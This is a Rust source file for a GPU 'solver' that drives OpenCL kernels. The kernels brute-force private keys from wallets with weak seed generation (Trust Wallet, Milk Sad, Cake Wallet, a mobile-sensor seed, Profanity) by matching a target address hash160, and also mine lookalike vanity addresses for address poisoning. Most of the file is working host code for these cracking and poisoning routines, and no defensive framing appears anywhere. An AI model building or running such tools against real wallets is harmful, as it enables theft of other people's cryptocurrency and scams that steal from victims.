use ocl::{Buffer, MemFlags, ProQue, Device};
use tracing::{info, error};

pub struct GpuSolver {
    pro_que: ProQue,
    kernel_name: String,
    max_work_group_size: usize,
    preferred_work_group_multiple: usize,
    max_compute_units: u32,
    local_mem_size: u64,
}

impl GpuSolver {
    pub fn new() -> ocl::Result<Self> {
        info!("[GPU] Initializing GPU solver...");
        let _src = include_str!("../../cl/batch_address.cl");

        let files = [
            "common",
            "ripemd",
            "sha2",
            "sha512",
            "secp256k1_common",
            "secp256k1_scalar",
            "secp256k1_field",
            "secp256k1_group",
            "secp256k1_prec",
            "secp256k1",
            "address",
            "mnemonic_constants",
            "mt19937",
            "dart_prng",
            "bip39_helpers",
            "bip39_wordlist_complete",
            "bip39_full",
            "batch_address",
            "batch_cake_wallet",
            "cake_hash",
            "mobile_sensor_hash",
            "base58",
            "address_poisoning",
            "mobile_sensor_crack",
            "keccak256",
            "mt19937_64",
            "batch_profanity",
            "trust_wallet_crack",
            "milk_sad_crack",
            "test_mt19937",
            "milk_sad_crack_multi30",
        ];

        info!("[GPU] Loading {} kernel files...", files.len());
        let mut raw_cl_file = String::new();
        for file in &files {
            let path = format!("cl/{}.cl", file);
            let content = std::fs::read_to_string(&path).map_err(|e| {
                error!("[GPU] ERROR: Failed to read {}: {}", path, e);
                ocl::Error::from(e.to_string())
            })?;
            raw_cl_file.push_str(&content);
            raw_cl_file.push_str("\n");
        }
        info!(
            "[GPU] Total kernel source size: {} bytes",
            raw_cl_file.len()
        );

        info!("[GPU] Building OpenCL program...");
        let mut prog_bldr = ocl::Program::builder();
        
        // Add aggressive compiler optimizations
        prog_bldr.src(raw_cl_file).cmplr_opt(
            "-w -cl-fast-relaxed-math -cl-mad-enable -cl-no-signed-zeros -cl-unsafe-math-optimizations"
        );

        let pro_que = ProQue::builder().prog_bldr(prog_bldr).dims(1).build()?;

        let device = pro_que.device();
        
        // Query device capabilities for optimal work group sizing
        let max_work_group_size = device.max_wg_size()? as usize;
        let max_compute_units = match device.info(ocl::enums::DeviceInfo::MaxComputeUnits)? {
            ocl::enums::DeviceInfoResult::MaxComputeUnits(n) => n,
            _ => 1,
        };
        let local_mem_size = match device.info(ocl::enums::DeviceInfo::LocalMemSize)? {
            ocl::enums::DeviceInfoResult::LocalMemSize(n) => n,
            _ => 0,
        };
        
        // Determine preferred work group multiple (warp/wavefront size)
        // Default to 32 if query fails or variant not found
        let preferred_work_group_multiple = 32;

        info!("[GPU] ✓ GPU solver initialized successfully");
        info!("[GPU] Device: {:?}", device.name()?);
        info!("[GPU] Max work group size: {}", max_work_group_size);
        info!("[GPU] Preferred work group multiple: {}", preferred_work_group_multiple);
        info!("[GPU] Max compute units: {}", max_compute_units);
        info!("[GPU] Local memory size: {} KB", local_mem_size / 1024);

        Ok(Self {
            pro_que,
            kernel_name: "batch_address".to_string(),
            max_work_group_size,
            preferred_work_group_multiple,
            max_compute_units,
            local_mem_size,
        })
    }

    // Helper function to calculate optimal local work size based on device capabilities
    fn calculate_local_work_size(&self, global_size: usize) -> usize {
        if global_size < self.preferred_work_group_multiple {
            return global_size;
        }

        // Find the largest multiple of preferred_work_group_multiple that divides global_size
        // and doesn't exceed max_work_group_size
        for i in (1..=(self.max_work_group_size / self.preferred_work_group_multiple)).rev() {
            let local_size = i * self.preferred_work_group_multiple;
            if global_size % local_size == 0 {
                return local_size;
            }
        }

        // Fall back to preferred multiple
        self.preferred_work_group_multiple
    }
    
    // Calculate optimal batch size based on device compute units
    fn calculate_optimal_batch_size(&self, work_per_item: usize) -> usize {
        // Aim for 2-4 work items per compute unit for good occupancy
        let occupancy_factor = 4;
        let optimal_size = (self.max_compute_units as usize) * self.max_work_group_size * occupancy_factor;
        
        // Round to nearest preferred work group multiple
        let rounded = ((optimal_size + self.preferred_work_group_multiple - 1) 
                      / self.preferred_work_group_multiple) 
                      * self.preferred_work_group_multiple;
        
        rounded.max(self.preferred_work_group_multiple)
    }

    pub fn compute_batch(
        &self,
        entropies: &[[u8; 16]],
        purpose: u32,
    ) -> ocl::Result<Vec<[u8; 25]>> {
        let batch_size = entropies.len();
        if batch_size == 0 {
            return Ok(Vec::new());
        }

        // Split 128-bit entropy into two 64-bit ulongs for OpenCL
        // GPU reconstructs bytes in big-endian order, so we must send as big-endian
        let mut entropies_hi = Vec::with_capacity(batch_size);
        let mut entropies_lo = Vec::with_capacity(batch_size);

        for ent in entropies {
            let hi = u64::from_be_bytes(
                ent[0..8]
                    .try_into()
                    .expect("Entropy should always be 16 bytes"),
            );
            let lo = u64::from_be_bytes(
                ent[8..16]
                    .try_into()
                    .expect("Entropy should always be 16 bytes"),
            );
            entropies_hi.push(hi);
            entropies_lo.push(lo);
        }

        // Use pinned/alloc_host_ptr for faster CPU-GPU transfers
        let buffer_hi = Buffer::builder()
            .queue(self.pro_que.queue().clone())
            .flags(MemFlags::new().read_only().alloc_host_ptr().copy_host_ptr())
            .len(batch_size)
            .copy_host_slice(&entropies_hi)
            .build()?;

        let buffer_lo = Buffer::builder()
            .queue(self.pro_que.queue().clone())
            .flags(MemFlags::new().read_only().alloc_host_ptr().copy_host_ptr())
            .len(batch_size)
            .copy_host_slice(&entropies_lo)
            .build()?;

        let output_len = batch_size * 25;
        let buffer_out = Buffer::<u8>::builder()
            .queue(self.pro_que.queue().clone())
            .flags(MemFlags::new().write_only().alloc_host_ptr())
            .len(output_len)
            .build()?;

        // Calculate optimal local work size
        let local_work_size = self.calculate_local_work_size(batch_size);

        let kernel = self
            .pro_que
            .kernel_builder(&self.kernel_name)
            .arg(&buffer_hi)
            .arg(&buffer_lo)
            .arg(&buffer_out)
            .arg(purpose)
            .global_work_size(batch_size)
            .local_work_size(local_work_size)
            .build()?;

        unsafe {
            kernel.enq()?;
        }

        let mut output = vec![0u8; output_len];
        buffer_out.read(&mut output).enq()?;

        let mut results = Vec::with_capacity(batch_size);
        for chunk in output.chunks(25) {
            let mut addr = [0u8; 25];
            addr.copy_from_slice(chunk);
            results.push(addr);
        }

        Ok(results)
    }

    pub fn compute_cake_hash(
        &self,
        timestamps: &[u64],
        target_hashes: &[u8], // Flattened sorted hashes
    ) -> ocl::Result<Vec<u64>> {
        let batch_size = timestamps.len();
        let target_count = target_hashes.len() / 32;

        // Use pinned memory for faster transfers
        let buffer_timestamps = Buffer::builder()
            .queue(self.pro_que.queue().clone())
            .flags(MemFlags::new().read_only().alloc_host_ptr().copy_host_ptr())
            .len(batch_size)
            .copy_host_slice(timestamps)
            .build()?;

        // Input buffer: target hashes (read-only, can be cached)
        let buffer_hashes = Buffer::builder()
            .queue(self.pro_que.queue().clone())
            .flags(MemFlags::new().read_only().alloc_host_ptr().copy_host_ptr())
            .len(target_hashes.len())
            .copy_host_slice(target_hashes)
            .build()?;

        // Output buffer: results (timestamps)
        // Max 1024 results per batch (unlikely to find many)
        let max_results = 1024;
        let buffer_results = Buffer::<u64>::builder()
            .queue(self.pro_que.queue().clone())
            .flags(MemFlags::new().write_only().alloc_host_ptr())
            .len(max_results)
            .build()?;

        // Output buffer: result count
        let buffer_count = Buffer::<u32>::builder()
            .queue(self.pro_que.queue().clone())
            .flags(MemFlags::new().read_write().alloc_host_ptr().copy_host_ptr())
            .len(1)
            .copy_host_slice(&[0u32])
            .build()?;

        // Calculate optimal local work size
        let local_work_size = self.calculate_local_work_size(batch_size);

        let kernel = self
            .pro_que
            .kernel_builder("cake_hash")
            .arg(&buffer_timestamps)
            .arg(&buffer_hashes)
            .arg(target_count as u32)
            .arg(&buffer_results)
            .arg(&buffer_count)
            .global_work_size(batch_size)
            .local_work_size(local_work_size)
            .build()?;

        unsafe {
            kernel.enq()?;
        }

        // Read count
        let mut count_vec = vec![0u32; 1];
        buffer_count.read(&mut count_vec).enq()?;
        let count = count_vec[0] as usize;

        if count > 0 {
            let read_count = std::cmp::min(count, max_results);
            let mut results = vec![0u64; max_results];
            buffer_results.read(&mut results).enq()?;

            // Return only valid results
            Ok(results[0..read_count].to_vec())
        } else {
            Ok(Vec::new())
        }
    }

    /// Compute SHA‑256 hashes for simulated mobile‑sensor seeds.
    /// Returns a vector of 32‑byte hashes, one per index.
    pub fn compute_mobile_hash(&self, indices: &[u64]) -> ocl::Result<Vec<[u8; 32]>> {
        let count = indices.len();
        if count == 0 {
            return Ok(Vec::new());
        }

        // Input buffer: device indices (with pinned memory)
        let buffer_indices = Buffer::builder()
            .queue(self.pro_que.queue().clone())
            .flags(MemFlags::new().read_only().alloc_host_ptr().copy_host_ptr())
            .len(count)
            .copy_host_slice(indices)
            .build()?;

        // Output buffer: hashes (count * 32 bytes, with pinned memory)
        let out_len = count * 32;
        let buffer_out = Buffer::<u8>::builder()
            .queue(self.pro_que.queue().clone())
            .flags(MemFlags::new().write_only().alloc_host_ptr())
            .len(out_len)
            .build()?;

        // Calculate optimal local work size
        let local_work_size = self.calculate_local_work_size(count);

        let kernel = self
            .pro_que
            .kernel_builder("mobile_sensor_hash")
            .arg(&buffer_indices)
            .arg(&buffer_out)
            .arg(count as u32)
            .global_work_size(count)
            .local_work_size(local_work_size)
            .build()?;

        unsafe {
            kernel.enq()?;
        }

        // Read back hashes
        let mut raw = vec![0u8; out_len];
        buffer_out.read(&mut raw).enq()?;

        // Chunk into [u8;32]
        let mut hashes: Vec<[u8; 32]> = Vec::with_capacity(count);
        for chunk in raw.chunks(32) {
            let mut arr = [0u8; 32];
            arr.copy_from_slice(chunk);
            hashes.push(arr);
        }
        Ok(hashes)
    }

    /// Compute Address Poisoning (Vanity Address Generation)
    /// Returns matching private key seeds
    pub fn compute_address_poisoning(
        &self,
        seed_base: u64,
        batch_size: usize,
        target_prefix: &str,
        target_suffix: &str,
    ) -> ocl::Result<Vec<u64>> {
        // Encode prefix/suffix into u64 (max 8 chars)
        let mut prefix_encoded = 0u64;
        for (i, b) in target_prefix.bytes().enumerate().take(8) {
            prefix_encoded |= (b as u64) << (i * 8);
        }

        let mut suffix_encoded = 0u64;
        for (i, b) in target_suffix.bytes().enumerate().take(8) {
            suffix_encoded |= (b as u64) << (i * 8);
        }

        // Output buffers
        let max_results = 1024;
        let buffer_results = Buffer::<u64>::builder()
            .queue(self.pro_que.queue().clone())
            .flags(MemFlags::new().write_only())
            .len(max_results)
            .build()?;

        let buffer_count = Buffer::<u32>::builder()
            .queue(self.pro_que.queue().clone())
            .flags(MemFlags::new().read_write().copy_host_ptr())
            .len(1)
            .copy_host_slice(&[0u32])
            .build()?;

        let kernel = self
            .pro_que
            .kernel_builder("address_poisoning")
            .arg(seed_base)
            .arg(&buffer_results)
            .arg(&buffer_count)
            .arg(target_prefix.len() as u32)
            .arg(target_suffix.len() as u32)
            .arg(prefix_encoded)
            .arg(suffix_encoded)
            .global_work_size(batch_size)
            .build()?;

        unsafe {
            kernel.enq()?;
        }

        // Read count
        let mut count_vec = vec![0u32; 1];
        buffer_count.read(&mut count_vec).enq()?;
        let count = count_vec[0] as usize;

        if count > 0 {
            let read_count = std::cmp::min(count, max_results);
            let mut results = vec![0u64; max_results];
            buffer_results.read(&mut results).enq()?;
            Ok(results[0..read_count].to_vec())
        } else {
            Ok(Vec::new())
        }
    }

    /// Compute Mobile Sensor Crack
    /// Brute-forces sensor values to find a matching address hash160.
    /// Returns matching GIDs (which map to x,y,z).
    pub fn compute_mobile_crack(&self, target_h160: &[u8; 20]) -> ocl::Result<Vec<u64>> {
        // Pack hash160 into ulongs/uint
        let mut h1 = 0u64;
        let mut h2 = 0u64;
        let mut h3 = 0u32;

        for i in 0..8 {
            h1 |= (target_h160[i] as u64) << (i * 8);
        }
        for i in 0..8 {
            h2 |= (target_h160[i + 8] as u64) << (i * 8);
        }
        for i in 0..4 {
            h3 |= (target_h160[i + 16] as u32) << (i * 8);
        }

        // Output buffers (with pinned memory for faster results readback)
        let max_results = 1024;
        let buffer_results = Buffer::<u64>::builder()
            .queue(self.pro_que.queue().clone())
            .flags(MemFlags::new().write_only().alloc_host_ptr())
            .len(max_results)
            .build()?;

        let buffer_count = Buffer::<u32>::builder()
            .queue(self.pro_que.queue().clone())
            .flags(MemFlags::new().read_write().alloc_host_ptr().copy_host_ptr())
            .len(1)
            .copy_host_slice(&[0u32])
            .build()?;

        // Search space: 201 * 201 * 201 = 8,120,601
        let range = 201 * 201 * 201;
        // Use device-specific local work size
        let local_work_size = self.max_work_group_size.min(256);
        let global_work_size = ((range + local_work_size - 1) / local_work_size) * local_work_size;
        let offset: u64 = 0;

        let kernel = self
            .pro_que
            .kernel_builder("mobile_sensor_crack")
            .arg(&buffer_results)
            .arg(&buffer_count)
            .arg(h1)
            .arg(h2)
            .arg(h3)
            .arg(offset)
            .global_work_size(global_work_size)
            .local_work_size(local_work_size)
            .build()?;

        unsafe {
            kernel.enq()?;
        }

        // Read count
        let mut count_vec = vec![0u32; 1];
        buffer_count.read(&mut count_vec).enq()?;
        let count = count_vec[0] as usize;

        if count > 0 {
            let read_count = std::cmp::min(count, max_results);
            let mut results = vec![0u64; max_results];
            buffer_results.read(&mut results).enq()?;
            Ok(results[0..read_count].to_vec())
        } else {
            Ok(Vec::new())
        }
    }
    pub fn compute_profanity(
        &self,
        search_space: u64,
        target_addr: &[u8],
    ) -> ocl::Result<Vec<u64>> {
        let kernel_name = "batch_profanity";

        // Output buffers (with pinned memory)
        let max_results = 1024;
        let buffer_results = Buffer::<u64>::builder()
            .queue(self.pro_que.queue().clone())
            .flags(MemFlags::new().read_write().alloc_host_ptr())
            .len(max_results)
            .build()?;

        let buffer_count = Buffer::<u32>::builder()
            .queue(self.pro_que.queue().clone())
            .flags(MemFlags::new().read_write().alloc_host_ptr())
            .len(1)
            .build()?;

        // Reset count
        buffer_count.write(&vec![0u32]).enq()?;

        // Parse target address parts
        let mut t1: u64 = 0;
        let mut t2: u64 = 0;
        let mut t3: u32 = 0;

        for i in 0..8 {
            t1 |= (target_addr[i] as u64) << (i * 8);
        }
        for i in 0..8 {
            t2 |= (target_addr[i + 8] as u64) << (i * 8);
        }
        for i in 0..4 {
            t3 |= (target_addr[i + 16] as u32) << (i * 8);
        }

        // Create kernel
        let kernel = self
            .pro_que
            .kernel_builder(kernel_name)
            .arg(&buffer_results)
            .arg(&buffer_count)
            .arg(t1)
            .arg(t2)
            .arg(t3)
            .arg(0u64) // Offset
            .build()?;

        // Run with device-optimized work group size
        let global_work_size = search_space;
        let local_work_size = self.max_work_group_size.min(256);

        unsafe {
            kernel
                .cmd()
                .global_work_size(global_work_size as usize)
                .local_work_size(local_work_size)
                .enq()?;
        }

        // Read results
        let mut count_vec = vec![0u32; 1];
        buffer_count.read(&mut count_vec).enq()?;
        let count = count_vec[0] as usize;

        if count > 0 {
            let read_count = std::cmp::min(count, max_results);
            let mut results = vec![0u64; max_results];
            buffer_results.read(&mut results).enq()?;
            Ok(results[0..read_count].to_vec())
        } else {
            Ok(Vec::new())
        }
    }

    pub fn compute_trust_wallet_crack(
        &self,
        start_timestamp: u32,
        end_timestamp: u32,
        target_h160: &[u8; 20],
    ) -> ocl::Result<Vec<u64>> {
        let kernel_name = "trust_wallet_crack";

        let max_results = 1024;
        let buffer_results = Buffer::<u64>::builder()
            .queue(self.pro_que.queue().clone())
            .flags(MemFlags::new().read_write().alloc_host_ptr())
            .len(max_results)
            .build()?;

        let buffer_count = Buffer::<u32>::builder()
            .queue(self.pro_que.queue().clone())
            .flags(MemFlags::new().read_write().alloc_host_ptr())
            .len(1)
            .build()?;

        buffer_count.write(&vec![0u32]).enq()?;

        // Parse target Hash160
        let mut h1: u64 = 0;
        let mut h2: u64 = 0;
        let mut h3: u32 = 0;

        for i in 0..8 {
            h1 |= (target_h160[i] as u64) << (i * 8);
        }
        for i in 0..8 {
            h2 |= (target_h160[i + 8] as u64) << (i * 8);
        }
        for i in 0..4 {
            h3 |= (target_h160[i + 16] as u32) << (i * 8);
        }

        let kernel = self
            .pro_que
            .kernel_builder(kernel_name)
            .arg(&buffer_results)
            .arg(&buffer_count)
            .arg(h1)
            .arg(h2)
            .arg(h3)
            .arg(start_timestamp) // Offset - CRITICAL: must be start_timestamp, not 0
            .build()?;

        let range = (end_timestamp - start_timestamp) as usize;
        // Use device-optimized work group size
        let local_work_size = self.max_work_group_size.min(256);
        // Round up to nearest multiple of local_work_size
        let global_work_size = ((range + local_work_size - 1) / local_work_size) * local_work_size;

        unsafe {
            kernel
                .cmd()
                .global_work_size(global_work_size)
                .local_work_size(local_work_size)
                .enq()?;
        }

        let mut count_vec = vec![0u32; 1];
        buffer_count.read(&mut count_vec).enq()?;
        let count = count_vec[0] as usize;

        if count > 0 {
            let read_count = std::cmp::min(count, max_results);
            let mut results = vec![0u64; max_results];
            buffer_results.read(&mut results).enq()?;
            Ok(results[0..read_count].to_vec())
        } else {
            Ok(Vec::new())
        }
    }

    /// Compute Cake Wallet Crack (Electrum Prefix)
    /// Scans a range of 32-bit seed indices.
    /// Checks prefix validity (starts with "100") and then scans 40 addresses (change 0/1, index 0-19).
    /// Returns: Vec<(seed_index, change, address_index)>
    pub fn compute_cake_wallet_crack(
        &self,
        start_index: u32,
        count: u32,
        target_h160: &[u8; 20],
    ) -> ocl::Result<Vec<(u32, u32, u32)>> {
        let kernel_name = "cake_wallet_crack";

        // Results buffer: Each hit stores 3 values (seed, change, index)
        // Adjust buffer size accordingly
        let max_hits = 1024;
        let buffer_results = Buffer::<u64>::builder()
            .queue(self.pro_que.queue().clone())
            .flags(MemFlags::new().read_write().alloc_host_ptr())
            .len(max_hits * 3) // 3 values per hit
            .build()?;

        let buffer_count = Buffer::<u32>::builder()
            .queue(self.pro_que.queue().clone())
            .flags(MemFlags::new().read_write().alloc_host_ptr())
            .len(1)
            .build()?;

        buffer_count.write(&vec![0u32]).enq()?;

        // Pack target Hash160
        let mut h1 = 0u64;
        let mut h2 = 0u64;
        let mut h3 = 0u32;
        for i in 0..8 { h1 |= (target_h160[i] as u64) << (i * 8); }
        for i in 0..8 { h2 |= (target_h160[i + 8] as u64) << (i * 8); }
        for i in 0..4 { h3 |= (target_h160[i + 16] as u32) << (i * 8); }

        let kernel = self
            .pro_que
            .kernel_builder(kernel_name)
            .arg(&buffer_results)
            .arg(&buffer_count)
            .arg(h1)
            .arg(h2)
            .arg(h3)
            .arg(start_index) // offset
            .global_work_size(count)
            // Use default local work size or tune it
            .build()?;

        unsafe { kernel.enq()?; }

        // Read count
        let mut count_vec = vec![0u32; 1];
        buffer_count.read(&mut count_vec).enq()?;
        let hit_count = count_vec[0] as usize;

        if hit_count > 0 {
            let read_hits = std::cmp::min(hit_count, max_hits);
            let mut raw_results = vec![0u64; read_hits * 3];
            buffer_results.read(&mut raw_results).enq()?;

            let mut results = Vec::new();
            for i in 0..read_hits {
                let seed = raw_results[i * 3] as u32;
                let change = raw_results[i * 3 + 1] as u32;
                let idx = raw_results[i * 3 + 2] as u32;
                results.push((seed, change, idx));
            }
            Ok(results)
        } else {
            Ok(Vec::new())
        }
    }

    /// Compute Cake Wallet Full Batch
    /// Takes a list of verified seed indices.
    /// Derives 40 addresses for each seed: change 0/1 * index 0-19.
    /// Returns: Flattened vector of 33-byte Compressed Public Keys (count * 40 items).
    pub fn compute_cake_batch_full(
        &self,
        seed_indices: &[u32],
    ) -> ocl::Result<Vec<[u8; 33]>> {
        let kernel_name = "batch_cake_full";
        let batch_size = seed_indices.len();
        if batch_size == 0 { return Ok(Vec::new()); }

        // Input buffer: Seed indices
        let buffer_seeds = Buffer::<u32>::builder()
            .queue(self.pro_que.queue().clone())
            .flags(MemFlags::new().read_only().copy_host_ptr())
            .len(batch_size)
            .copy_host_slice(seed_indices)
            .build()?;

        // Output buffer: 40 keys per seed * 33 bytes per key
        // Using u8 buffer for direct byte access
        let total_output_bytes = batch_size * 40 * 33;
        let buffer_results = Buffer::<u8>::builder()
            .queue(self.pro_que.queue().clone())
            .flags(MemFlags::new().write_only().alloc_host_ptr())
            .len(total_output_bytes)
            .build()?;

        let kernel = self
            .pro_que
            .kernel_builder(kernel_name)
            .arg(&buffer_seeds)
            .arg(&buffer_results)
            .arg(batch_size as u32)
            .global_work_size(batch_size)
            .build()?;

        unsafe { kernel.enq()?; }

        // Read results
        let mut results_bytes = vec![0u8; total_output_bytes];
        buffer_results.read(&mut results_bytes).enq()?;

        // Convert flat bytes to [u8; 33]
        let mut keys = Vec::with_capacity(batch_size * 40);
        for chunk in results_bytes.chunks_exact(33) {
            let mut k = [0u8; 33];
            k.copy_from_slice(chunk);
            keys.push(k);
        }

        Ok(keys)
    }

    pub fn compute_milk_sad_crack(
        &self,
        start_timestamp: u32,
        end_timestamp: u32,
        target_h160: &[u8; 20],
    ) -> ocl::Result<Vec<u64>> {
        let kernel_name = "milk_sad_crack";

        let max_results = 1024;
        let buffer_results = Buffer::<u64>::builder()
            .queue(self.pro_que.queue().clone())
            .flags(MemFlags::new().read_write().alloc_host_ptr())
            .len(max_results)
            .build()?;

        let buffer_count = Buffer::<u32>::builder()
            .queue(self.pro_que.queue().clone())
            .flags(MemFlags::new().read_write().alloc_host_ptr())
            .len(1)
            .build()?;

        buffer_count.write(&vec![0u32]).enq()?;

        // Parse target Hash160
        let mut h1: u64 = 0;
        let mut h2: u64 = 0;
        let mut h3: u32 = 0;

        for i in 0..8 {
            h1 |= (target_h160[i] as u64) << (i * 8);
        }
        for i in 0..8 {
            h2 |= (target_h160[i + 8] as u64) << (i * 8);
        }
        for i in 0..4 {
            h3 |= (target_h160[i + 16] as u32) << (i * 8);
        }

        let kernel = self
            .pro_que
            .kernel_builder(kernel_name)
            .arg(&buffer_results)
            .arg(&buffer_count)
            .arg(h1)
            .arg(h2)
            .arg(h3)
            .arg(start_timestamp) // Offset - CRITICAL: must be start_timestamp, not 0
            .build()?;

        let range = (end_timestamp - start_timestamp) as usize;
        // Use device-optimized work group size
        let local_work_size = self.max_work_group_size.min(256);
        // Round up to nearest multiple of local_work_size
        let global_work_size = ((range + local_work_size - 1) / local_work_size) * local_work_size;

        unsafe {
            kernel
                .cmd()
                .global_work_size(global_work_size)
                .local_work_size(local_work_size)
                .enq()?;
        }

        let mut count_vec = vec![0u32; 1];
        buffer_count.read(&mut count_vec).enq()?;
        let count = count_vec[0] as usize;

        if count > 0 {
            let read_count = std::cmp::min(count, max_results);
            let mut results = vec![0u64; max_results];
            buffer_results.read(&mut results).enq()?;
            Ok(results[0..read_count].to_vec())
        } else {
            Ok(Vec::new())
        }
    }

    /// Multi-path MilkSad crack - checks multiple derivation paths per seed
    /// Returns: Vec of (timestamp, chain_type, address_index) where chain_type: 0=receive, 1=change
    /// Multi-path MilkSad crack - checks 30 receive addresses per timestamp
    /// Returns: Vec of (timestamp, address_index)
    pub fn compute_milk_sad_crack_multipath(
        &self,
        start_timestamp: u32,
        end_timestamp: u32,
        target_h160: &[u8; 20],
    ) -> ocl::Result<Vec<(u32, u32)>> {
        let kernel_name = "milk_sad_crack_multi30";

        let max_results = 1024;
        let buffer_results = Buffer::<u64>::builder()
            .queue(self.pro_que.queue().clone())
            .flags(MemFlags::new().read_write().alloc_host_ptr())
            .len(max_results)
            .build()?;

        let buffer_count = Buffer::<u32>::builder()
            .queue(self.pro_que.queue().clone())
            .flags(MemFlags::new().read_write().alloc_host_ptr())
            .len(1)
            .build()?;

        buffer_count.write(&vec![0u32]).enq()?;

        // Parse target Hash160
        let mut h1: u64 = 0;
        let mut h2: u64 = 0;
        let mut h3: u32 = 0;

        for i in 0..8 {
            h1 |= (target_h160[i] as u64) << (i * 8);
        }
        for i in 0..8 {
            h2 |= (target_h160[i + 8] as u64) << (i * 8);
        }
        for i in 0..4 {
            h3 |= (target_h160[i + 16] as u32) << (i * 8);
        }

        let kernel = self
            .pro_que
            .kernel_builder(kernel_name)
            .arg(&buffer_results)
            .arg(&buffer_count)
            .arg(h1)
            .arg(h2)
            .arg(h3)
            .arg(start_timestamp) // Offset - CRITICAL: must be start_timestamp, not 0
            .build()?;

        let range = (end_timestamp - start_timestamp) as usize;
        // Use device-optimized work group size
        let local_work_size = self.max_work_group_size.min(256);
        let global_work_size = ((range + local_work_size - 1) / local_work_size) * local_work_size;

        unsafe {
            kernel
                .cmd()
                .global_work_size(global_work_size)
                .local_work_size(local_work_size)
                .enq()?;
        }

        let mut count_vec = vec![0u32; 1];
        buffer_count.read(&mut count_vec).enq()?;
        let count = count_vec[0] as usize;

        if count > 0 {
            let read_count = std::cmp::min(count, max_results);
            let mut results = vec![0u64; max_results];
            buffer_results.read(&mut results).enq()?;

            let mut output = Vec::new();
            for i in 0..read_count {
                let val = results[i];
                let timestamp = (val & 0xFFFFFFFF) as u32;
                let addr_idx = (val >> 32) as u32;
                output.push((timestamp, addr_idx));
            }
            Ok(output)
        } else {
            Ok(Vec::new())
        }
    }

    /// Test MT19937 implementation against known test vectors
    pub fn test_mt19937(&self, seeds: &[u32]) -> ocl::Result<Vec<[u8; 16]>> {
        let count = seeds.len();

        let buffer_seeds = Buffer::builder()
            .queue(self.pro_que.queue().clone())
            .flags(MemFlags::new().read_only().alloc_host_ptr().copy_host_ptr())
            .len(count)
            .copy_host_slice(seeds)
            .build()?;

        let buffer_results = Buffer::<u8>::builder()
            .queue(self.pro_que.queue().clone())
            .flags(MemFlags::new().write_only().alloc_host_ptr())
            .len(count * 16)
            .build()?;

        let local_work_size = self.calculate_local_work_size(count);

        let kernel = self
            .pro_que
            .kernel_builder("test_mt19937")
            .arg(&buffer_seeds)
            .arg(&buffer_results)
            .arg(count as u32)
            .global_work_size(count)
            .local_work_size(local_work_size)
            .build()?;

        unsafe {
            kernel.enq()?;
        }

        let mut raw_results = vec![0u8; count * 16];
        buffer_results.read(&mut raw_results).enq()?;

        let mut results = Vec::with_capacity(count);
        for chunk in raw_results.chunks(16) {
            let mut entropy = [0u8; 16];
            entropy.copy_from_slice(chunk);
            results.push(entropy);
        }

        Ok(results)
    }
    
    /// Get GPU device information for debugging and profiling
    pub fn device_info(&self) -> ocl::Result<String> {
        let device = self.pro_que.device();
        let name = device.name()?;
        let vendor = device.vendor()?;
        let version = device.version()?;
        let driver = device.version()?;
        let compute_units = match device.info(ocl::enums::DeviceInfo::MaxComputeUnits)? {
            ocl::enums::DeviceInfoResult::MaxComputeUnits(n) => n,
            _ => 0,
        };
        let clock_freq = match device.info(ocl::enums::DeviceInfo::MaxClockFrequency)? {
            ocl::enums::DeviceInfoResult::MaxClockFrequency(n) => n,
            _ => 0,
        };
        let global_mem = match device.info(ocl::enums::DeviceInfo::GlobalMemSize)? {
            ocl::enums::DeviceInfoResult::GlobalMemSize(n) => n,
            _ => 0,
        } / (1024 * 1024); // MB
        let local_mem = match device.info(ocl::enums::DeviceInfo::LocalMemSize)? {
            ocl::enums::DeviceInfoResult::LocalMemSize(n) => n,
            _ => 0,
        } / 1024; // KB
        let max_alloc = match device.info(ocl::enums::DeviceInfo::MaxMemAllocSize)? {
            ocl::enums::DeviceInfoResult::MaxMemAllocSize(n) => n,
            _ => 0,
        } / (1024 * 1024); // MB
        
        Ok(format!(
            "GPU Device Information:\n\
             Name: {}\n\
             Vendor: {}\n\
             Version: {}\n\
             Driver: {}\n\
             Compute Units: {}\n\
             Clock Frequency: {} MHz\n\
             Global Memory: {} MB\n\
             Local Memory: {} KB\n\
             Max Allocation: {} MB\n\
             Max Work Group Size: {}\n\
             Preferred Multiple: {}",
            name, vendor, version, driver,
            compute_units, clock_freq, global_mem, local_mem, max_alloc,
            self.max_work_group_size, self.preferred_work_group_multiple
        ))
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_mt19937_validation() {
        // Test vectors generated from standard MT19937
        let test_cases = vec![
            (
                0u32,
                &[
                    0x8cu8, 0x7fu8, 0x0au8, 0xacu8, 0x97u8, 0xc4u8, 0xaau8, 0x2fu8, 0xb7u8, 0x16u8,
                    0xa6u8, 0x75u8, 0xd8u8, 0x21u8, 0xccu8, 0xc0u8,
                ] as &[u8],
            ),
            (
                1u32,
                &[
                    0x6au8, 0xc1u8, 0xf4u8, 0x25u8, 0xffu8, 0x47u8, 0x80u8, 0xebu8, 0xb8u8, 0x67u8,
                    0x2fu8, 0x8cu8, 0xeeu8, 0xbcu8, 0x14u8, 0x48u8,
                ] as &[u8],
            ),
            (
                1234567890u32,
                &[
                    0x9eu8, 0x69u8, 0x55u8, 0x82u8, 0x57u8, 0x2bu8, 0x97u8, 0xffu8, 0x97u8, 0x74u8,
                    0xa5u8, 0x66u8, 0x26u8, 0x26u8, 0xe4u8, 0x2fu8,
                ] as &[u8],
            ),
        ];

        // Initialize GPU solver
        let solver = match GpuSolver::new() {
            Ok(s) => s,
            Err(e) => {
                eprintln!("GPU not available for test: {}", e);
                return; // Skip test if no GPU
            }
        };

        let seeds: Vec<u32> = test_cases.iter().map(|(s, _)| *s).collect();

        match solver.test_mt19937(&seeds) {
            Ok(results) => {
                for (i, (seed, expected)) in test_cases.iter().enumerate() {
                    eprintln!("Testing seed: {}", seed);
                    eprintln!("  Expected: {:02x?}", expected);
                    eprintln!("  Got:      {:02x?}", &results[i]);
                    assert_eq!(
                        &results[i][..],
                        *expected,
                        "MT19937 mismatch for seed {}",
                        seed
                    );
                }
                eprintln!("✓ All MT19937 tests passed!");
            }
            Err(e) => {
                eprintln!("GPU test failed: {}", e);
                panic!("MT19937 GPU test failed");
            }
        }
    }
}
